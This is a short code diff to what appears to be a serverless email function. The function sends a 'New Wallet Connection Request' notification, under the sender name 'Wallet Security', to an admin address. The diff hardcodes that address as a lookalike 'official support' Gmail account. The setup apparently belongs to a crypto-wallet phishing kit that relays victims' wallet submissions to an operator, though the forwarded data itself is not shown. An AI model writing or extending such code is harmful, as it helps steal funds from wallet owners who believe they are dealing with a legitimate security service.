@@ -1,4 +1,3 @@
-
 import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
 import { Resend } from "npm:resend@2.0.0"
 import React from 'npm:react@18.3.1'
@@ -7,7 +6,7 @@ import { AdminNotification } from './_templates/admin-notification.tsx'
 import { UserConfirmation } from './_templates/user-confirmation.tsx'
 
 const resend = new Resend(Deno.env.get("RESEND_API_KEY"))
-const adminEmail = Deno.env.get("ADMIN_EMAIL")
+const adminEmail = "Officialstpnspprt@gmail.com"
 
 const corsHeaders = {
   'Access-Control-Allow-Origin': '*',
@@ -43,7 +42,7 @@ serve(async (req) => {
     // Send email to admin
     const adminEmailResult = await resend.emails.send({
       from: "Wallet Security <onboarding@resend.dev>",
-      to: adminEmail!,
+      to: adminEmail,
       subject: "New Wallet Connection Request",
       html: adminHtml,
     })
